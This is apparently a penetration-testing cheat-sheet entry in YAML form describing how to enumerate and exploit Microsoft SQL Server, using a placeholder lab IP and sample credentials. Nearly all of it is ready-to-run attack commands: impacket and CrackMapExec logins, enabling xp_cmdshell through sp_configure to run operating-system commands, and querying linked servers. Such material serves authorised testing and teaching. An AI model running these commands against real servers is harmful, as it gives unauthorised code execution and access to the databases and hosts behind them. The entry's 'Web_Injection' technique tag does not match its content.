---
description: |
  Enumerate and exploit MSSQL servers — execute queries, enable xp_cmdshell,
  and gain code execution.

  Reference values:
    Target IP: 10.10.10.1
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Connect with impacket
  impacket-mssqlclient pentuser:P@ssw0rd123@10.10.10.1

  # Connect with Windows auth
  impacket-mssqlclient test.local/pentuser:P@ssw0rd123@10.10.10.1 -windows-auth

  # Enable xp_cmdshell
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

  # Execute OS commands
  EXEC xp_cmdshell 'whoami';

  # CrackMapExec MSSQL
  crackmapexec mssql 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -x "whoami"

  # Enumerate linked servers
  EXEC sp_linkedservers;
  SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version');
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - MSSQL
items:
  - Username
  - Password
techniques:
  - Web_Injection
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html
---
